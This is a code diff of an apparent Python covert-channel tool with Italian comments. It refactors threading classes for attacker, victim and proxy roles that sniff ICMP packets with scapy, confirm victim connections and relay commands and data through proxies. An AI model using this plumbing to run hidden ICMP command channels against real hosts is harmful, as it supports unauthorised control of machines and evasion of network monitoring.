@@ -1,46 +1,16 @@
-from check_type import * 
-from custom_enum import MSG, ATTACK_TYPE 
-from mymethods import DATA
-from get_type import *
-
-class THREAD: 
-    def get_thread_response(proxy:ipaddress.IPv4Address=None,thread_lock:threading.Lock=None,thread_response:dict=None,response:bool=True):
-        if is_ipaddress(proxy) and is_threading_Lock(thread_lock) and is_dictionary(thread_response) and is_boolean(response):
-            response=None
-            thread_lock.acquire()
-            response=thread_response.get(proxy.compressed)
-            thread_lock.release()
-            return response 
-        return None 
-
-    def update_thread_response(proxy:ipaddress.IPv4Address=None, thread_lock:threading.Lock=None, thread_response:dict=None, response:bool=False):
-        if not (is_ipaddress(proxy) and is_threading_Lock(thread_lock) and is_dictionary(thread_response) and is_boolean(response)):  
-            raise Exception(f"update_thread_response: argomenti non validi")
-        thread_lock.acquire()
-        thread_response.update({proxy.compressed:response}) 
-        thread_lock.release() 
-        
-    def setup_thread_foreach_address(address_list:list[ipaddress.IPv4Address]=None,callback_function=None): 
-        if is_callable_function(callback_function) and is_list(address_list) and len(address_list)>0: 
-            thread_lock=threading.Lock()
-            thread_response={}
-            thread_list={}
-            for proxy in address_list:
-                if not is_ipaddress(proxy): 
-                    print(f"***\t{proxy} non è un indirizzo valido")
-                    continue
-                thread=threading.Thread(
-                    target=callback_function
-                    ,args=[proxy]
-                )
-                thread.name=f"Thread-{proxy.compressed}"
-                thread_list.update({proxy.compressed:thread})
-                thread_response.update({proxy.compressed:False}) 
-            print(f"Definito il threading lock per quando si accede alle risposte dei proxy") #print(f"Lock creato:\t{thread_lock}")
-            print("Definito per ogni proxy il proprio Thread") #print(f"Thread creati:\t{thread_list}")
-            print("Definito il dizionario contenente le risposte ricevute dai proxy") #print(f"Risposte create:\t{thread_proxy_response}")
-            return thread_lock, thread_response, thread_list 
-        raise Exception(f"Impossibile impostare il thread per ciascun proxy") 
+import ipaddress, threading, socket
+from type.check_type import is_threading_Timer, is_AsyncSniffer, is_string, is_ipaddress, is_threading_Lock, is_dictionary, is_boolean, is_callable_function, is_list, is_socket, is_enum_member, is_threading_Event, is_integer
+from classes import DATA, CALC
+from type.get_type import get_threading_Lock, get_timer, get_threading_Event, get_AsyncSniffer
+from custom_enum import ATTACK_TYPE, MSG, ICMP_TYPE, EXIT_CASES, SENDER_TYPE
+from victim_attack import HOST_CONNESSI, Victim
+from utils_methods import ask_bool_choice, threadEvent_wait, threadEvent_set
+from config import DEBUG, use_delay, type_sender, WAITING_TIME, timeout_time
+from attack.singleton import SendSingleton, ReceiveSingleton 
+from attack.attack_classes import _IPx
+from scapy.all import AsyncSniffer, Raw, IP, ICMP
+from network.network_methods import default_interface
+from network.network_classes import INTERFACE_FROM_IP 
 
 class THREAD_ATTACCANTE:
     class PROXIES_CONECTION: 
@@ -207,34 +177,19 @@ class THREAD_ATTACCANTE:
                     self.thread_list[key].start()  
             print("Definiti e avviati i thread che aspettano i dati dai proxy") 
 
-class THREADING_EVENT: 
-    def wait(event:threading.Event=None): 
-        if not is_threading_Event(event): 
-            raise Exception(f"Impossibile aspettare su una variabile non Event") 
-        event.wait() 
-        event.clear() 
-    
-    def set(event:threading.Event=None): 
-        if not is_threading_Event(event): 
-            raise Exception(f"Impossibile settare una variabile non Event") 
-        event.set()
 
-from victim_attack import CONNECTED_PROXY, Victim
-from mymethods import ask_bool_choice, exit_cases
-from network_methods import DEFAULT_INTERFACE 
-from custom_enum import ICMP_TYPE, SENDER_TYPE 
-from scapy.all import IP, ICMP, Raw, AsyncSniffer 
-from attacksingleton import SendSingleton, ReceiveSingleton, _IPx
+
+
 class THREAD_VICTIM: 
     class WAIT_CONNECTIONS: 
-        def __init__(self, vittima:Victim=None, num_connessioni:int=0, connected_proxy:CONNECTED_PROXY=None):
+        def __init__(self, vittima:Victim=None, num_connessioni:int=0, connected_proxy:HOST_CONNESSI=None):
             if not isinstance(vittima, Victim): 
                 raise TypeError("non oggetto Victim->",type(vittima)) 
             self.vittima=vittima 
             if not is_integer(num_connessioni) or num_connessioni<0: 
                 raise TypeError("numero non valido->",num_connessioni) 
             self.num_connessioni=num_connessioni
-            if not isinstance(connected_proxy, CONNECTED_PROXY): 
+            if not isinstance(connected_proxy, HOST_CONNESSI): 
                 raise TypeError("List host connessi non valida:",connected_proxy)
             self.connected_proxy=connected_proxy
             self.stop_flag={"value":False} 
@@ -256,9 +211,9 @@ class THREAD_VICTIM:
                     else: print("Smetto di aspettare...") 
                 else:print("Numero minimo di connessioni raggiunto") 
                 #self.stop_flag["value"]=True 
-                THREADING_EVENT.set(self.event_enough_proxy) 
+                threadEvent_set(self.event_enough_proxy) 
             def get_sniffer(): 
-                interface=DEFAULT_INTERFACE().default_iface 
+                interface=default_interface() 
                 if interface is None: 
                     raise ValueError("interface is None",interface) 
                 print("Monitoring interface->",interface) 
@@ -335,7 +290,7 @@ class THREAD_VICTIM:
                         proxy_necessari=self.num_connessioni-len(self.connected_proxy.proxy_list)
                         self.connected_proxy.lock.release() 
                         if proxy_necessari<=0: # and ask_bool_choice(msg)
-                            THREADING_EVENT.set(self.event_enough_proxy) 
+                            threadEvent_set(self.event_enough_proxy) 
                             self.stop_flag["value"]=True 
                     except Exception as e: 
                         print(e) 
@@ -369,7 +324,7 @@ class THREAD_VICTIM:
                 print("Sniffer started...") 
             else: raise RuntimeError("Sniffer not started...") 
             print("Waiting thread to end...") 
-            THREADING_EVENT.wait(self.event_enough_proxy) 
+            threadEvent_wait(self.event_enough_proxy) 
             if self.timer.is_alive(): 
                 self.timer.cancel()
                 print("Timer stopped...") 
@@ -402,7 +357,7 @@ class THREAD_VICTIM:
             if not is_string(comando): 
                 raise TypeError("comando non stringa",type(comando))  
             print("Command received:",comando) 
-            if any(case in comando for case in exit_cases): 
+            if any(case in comando for case in [e.value for e in EXIT_CASES]): 
                 raise ValueError("Comando per interruzione del programma") 
             self.comando=comando
 
@@ -495,4 +450,99 @@ class THREAD_VICTIM:
                     send_data(proxy_data[index], vittima.ip_host, ATTACK_TYPE.ipv4_destination_unreachable)  
                 else: 
                     send_data(proxy_data[index], vittima.connected_proxy.proxy_list[index], vittima.connected_proxy.type_attack[index]) 
+
+class THREAD_PROXY: 
+    class VICTIM_CONNECTION: 
+        def __init__(self): 
+            self.lock:threading.Lock=get_threading_Lock()  
+            self.stop_flag={"value":False} 
+            self.response:bool=False  
+            self.event_pktconn:threading.Event=get_threading_Event() 
+        
+        def start(self, ip_vittima:ipaddress.IPv4Address=None, ip_host:ipaddress.IPv4Address=None): 
+            def timeout_timer(): 
+                with self.lock:
+                    self.response=False 
+                    self.stop_flag["value"]=True 
+                threadEvent_set(self.event_pktconn) 
+            def get_filter(): 
+                #checksum=CALC.checksum(confirm_text.strip().encode()) 
+                IPv4_ECHO_REQ=8 
+                IPv4_ECHO_REP=0 
+                if ip_vittima.version==4: 
+                    icmp="icmp " 
+                elif ip_vittima.version==6: 
+                    icmp="icmp6 "  
+                if DEBUG: 
+                    filter=f"({icmp} or tcp) "
+                    #filter+=f" and src {oggetto.ip_vittima.compressed} "
+                    filter+=f" and dst {ip_host.compressed}"
+                    print("FILTER",filter)
+                    return filter
+                else: 
+                    filter=icmp 
+                    filter+=f" and (icmp[0]=={IPv4_ECHO_REQ} or icmp[0]=={IPv4_ECHO_REP}) " 
+                    filter+=f" and src {ip_vittima.compressed} "
+                    filter+=f" and dst {ip_host.compressed}"
+                #filter+=f"and icmp[4:2]={checksum} "
+                print("FILTER",filter)
+                return filter 
+            def callback_connessione(packet):  
+                #print(packet.summary()) 
+                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
+                    #and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
+                    if not ip_vittima.compressed==packet[IP].src: 
+                        return 
+                    confirm_text=(
+                        MSG.CONFIRM_VICTIM.value+
+                        ip_vittima.compressed+
+                        ip_host.compressed
+                    )
+                    check_sum=CALC.checksum(confirm_text.encode()) 
+                    if confirm_text in packet[Raw].load.decode(): 
+                        print("CONNESSIONE VITTIMA CONFERMATA")  
+                        with self.lock:
+                            self.response=True  
+                            self.stop_flag["value"]=True 
+                        threadEvent_set(self.event_pktconn) 
+                        return 
+            def stop_filter(pkt): 
+                with self.lock:
+                    value=self.stop_flag["value"]
+                return value
+            #-----------------------------------
+            if not is_ipaddress(ip_vittima): 
+                raise TypeError("Vittima non ha un IP valido")
+            if not is_ipaddress(ip_host): 
+                raise TypeError("Host non ha un IP valido") 
+            self.interface=INTERFACE_FROM_IP(ip_vittima).interface 
+            if self.interface is None: 
+                raise ValueError("interface is None",self.interface)  
+            timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
+            sniff_args={
+                "filter":get_filter()
+                #,"count":1 
+                ,"prn":callback_connessione
+                #,"store":False 
+                #,stop_filter=stop_filter 
+                ,"iface":self.interface 
+            } 
+            sniffer:AsyncSniffer=get_AsyncSniffer(sniff_args)  
+            sniffer.start()
+            if sniffer.running: 
+                print("Sniffer started...") 
+            else: raise RuntimeError("SNIFFER NOT STARTED") 
+            timer.start() 
+            if timer.is_alive(): 
+                print("Timer started...")  
+            threadEvent_wait(self.event_pktconn) 
+            if timer.is_alive(): 
+                timer.cancel()
+                print("Timer stopped...") 
+            sniffer.stop()
+            if sniffer.running: 
+                raise RuntimeError("SNIFFER NOT STOPPED",sniffer.running)
+            print("Sniffer stopped...") 
+
+
 
